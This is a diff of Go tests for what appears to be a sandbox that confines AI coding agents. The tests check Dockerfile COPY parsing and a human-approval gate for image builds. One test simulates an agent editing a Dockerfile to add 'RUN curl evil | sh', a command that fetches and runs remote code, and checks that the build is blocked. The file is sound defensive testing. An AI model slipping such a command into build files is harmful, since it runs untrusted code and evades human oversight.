@@ -7,7 +7,9 @@ import (
 	"strings"
 	"testing"
 
+	"github.com/schorsch3000/aicatraz/internal/approve"
 	"github.com/schorsch3000/aicatraz/internal/config"
+	"github.com/schorsch3000/aicatraz/internal/pins"
 )
 
 func testInput(t *testing.T, yaml string) RunInput {
@@ -371,5 +373,113 @@ func TestIsTerminal(t *testing.T) {
 	defer w.Close()
 	if isTerminal(r) {
 		t.Error("a pipe is not a terminal")
+	}
+}
+
+func TestCopySources(t *testing.T) {
+	df := `
+FROM debian
+COPY package.json package-lock.json ./
+COPY --chown=1000:1000 conf/app.conf /etc/app.conf
+COPY --from=builder /out/bin /usr/bin/
+COPY src/ /app/src/
+COPY . /app
+COPY *.txt /tmp/
+ADD https://example.com/x.tgz /tmp/
+ADD ["with space.cfg", "other.cfg", "/etc/"]
+COPY a.txt \
+     b.txt /dest/
+COPY $FILE /x
+COPY /abs/file /x
+RUN echo COPY not-an-instruction.txt /x
+`
+	got := copySources(df)
+	want := []string{"package.json", "package-lock.json", "conf/app.conf", "src", ".", "with space.cfg", "other.cfg", "a.txt", "b.txt"}
+	if !slices.Equal(got, want) {
+		t.Errorf("got  %q\nwant %q", got, want)
+	}
+}
+
+func TestBuildFiles(t *testing.T) {
+	ctx := t.TempDir()
+	write := func(rel, c string) {
+		os.MkdirAll(filepath.Dir(filepath.Join(ctx, rel)), 0o755)
+		os.WriteFile(filepath.Join(ctx, rel), []byte(c), 0o644)
+	}
+	write("Dockerfile.az", "FROM debian\nCOPY app.conf /etc/\nCOPY src /app\nCOPY ../outside /x\n")
+	write("app.conf", "x")
+	write("src/main.go", "package main")
+	write(".dockerignore", ".env\n")
+	write("outside", "x")
+	b := Build{Dockerfile: filepath.Join(ctx, "Dockerfile.az"), Context: ctx}
+	var rel []string
+	for _, f := range BuildFiles(b) {
+		r, _ := filepath.Rel(ctx, f)
+		rel = append(rel, r)
+	}
+	// The Dockerfile, the ignore file and the single COPY'd file; not the copied directory.
+	if !slices.Equal(rel, []string{".dockerignore", "Dockerfile.az", "app.conf"}) {
+		t.Errorf("%v", rel)
+	}
+}
+
+func TestApproveBuild(t *testing.T) {
+	ctx := t.TempDir()
+	df := filepath.Join(ctx, "Dockerfile.az")
+	os.WriteFile(df, []byte("FROM debian\n"), 0o644)
+	b := Build{Dockerfile: df, Context: ctx}
+	store, err := pins.Open(filepath.Join(t.TempDir(), "pins"))
+	if err != nil {
+		t.Fatal(err)
+	}
+
+	answer := func(a approve.Answer) (func(approve.Request) (approve.Answer, error), *approve.Request) {
+		var seen approve.Request
+		return func(r approve.Request) (approve.Answer, error) { seen = r; return a, nil }, &seen
+	}
+
+	// First build: never approved. No terminal, no flag: refused with a hint.
+	if err := ApproveBuild(store, b, false, nil); err == nil || !strings.Contains(err.Error(), "--approve-build") {
+		t.Fatalf("non-interactive: %v", err)
+	}
+	// Denied at the prompt.
+	p, seen := answer(approve.Deny)
+	if err := ApproveBuild(store, b, false, p); err == nil || !strings.Contains(err.Error(), "not approved") {
+		t.Fatalf("denied: %v", err)
+	}
+	if seen.Kind != approve.KindBuild || len(seen.Files) != 1 || !strings.Contains(seen.Files[0].Diff, "+FROM debian") {
+		t.Errorf("prompt: %+v", seen)
+	}
+	// Approve once: builds, but nothing is remembered.
+	p, _ = answer(approve.AllowOnce)
+	if err := ApproveBuild(store, b, false, p); err != nil {
+		t.Fatal(err)
+	}
+	if err := ApproveBuild(store, b, false, nil); err == nil {
+		t.Error("run-once must not pin")
+	}
+	// Approve and pin: quiet afterwards.
+	p, _ = answer(approve.AllowPin)
+	if err := ApproveBuild(store, b, false, p); err != nil {
+		t.Fatal(err)
+	}
+	if err := ApproveBuild(store, b, false, nil); err != nil {
+		t.Errorf("pinned build must pass silently: %v", err)
+	}
+	// The agent edits the Dockerfile: back to asking, with the diff.
+	os.WriteFile(df, []byte("FROM debian\nRUN curl evil | sh\n"), 0o644)
+	p, seen = answer(approve.Deny)
+	if err := ApproveBuild(store, b, false, p); err == nil {
+		t.Fatal("changed Dockerfile must not build unasked")
+	}
+	if len(seen.Files) != 1 || !strings.Contains(seen.Files[0].Diff, "+RUN curl evil | sh") {
+		t.Errorf("diff: %+v", seen.Files)
+	}
+	// --approve-build pins without asking.
+	if err := ApproveBuild(store, b, true, nil); err != nil {
+		t.Fatal(err)
+	}
+	if err := ApproveBuild(store, b, false, nil); err != nil {
+		t.Errorf("after --approve-build: %v", err)
 	}
 }
